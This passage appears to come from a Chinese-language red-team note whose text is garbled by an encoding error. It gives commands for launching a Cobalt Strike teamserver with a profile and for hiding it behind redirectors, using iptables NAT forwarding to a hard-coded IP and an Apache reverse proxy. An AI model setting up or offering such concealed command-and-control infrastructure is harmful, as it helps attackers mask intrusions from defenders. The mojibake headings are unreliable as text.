        }
    }
}
6ã€å¯åŠ¨CSåŠ è½½profile
./teamserver IP å¯†ç  xxx.profile


#ç«¯å£è½¬å‘-Iptables
1ã€è½¬å‘æœºè®¾ç½®è½¬å‘ï¼š(80æ”¹443å³https)
iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 47.94.236.117:80
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1
2ã€CSç›‘å¬å™¨é…ç½®è½¬å‘æœºIP


#ä¸­é—´ä»¶åå‘ä»£ç†-Apache
1ã€ä»£ç†æœºå®‰è£…Apacheï¼š
apt-get install apache2
a2enmod proxy proxy_ajp proxy_balancer proxy_connect proxy_http
systemctl restart apache2
/etc/apache2/sites-enabled/000-default.conf
2ã€ä¸­é—´ä»¶è®¾ç½®è½¬å‘ï¼š
http:
ProxyPass "/" "http://CSçš„IP/"
ProxyPassReverse "/" "http://CSçš„IP/"
https:
ProxyPass "/" "https://CSçš„IP/"
ProxyPassReverse "/" "https://CSçš„IP/"
3ã€é‡å¯ApacheæœåŠ¡
service apache2 restart
4ã€CSç›‘å¬å™¨é…ç½®è½¬å‘æœºIP
```

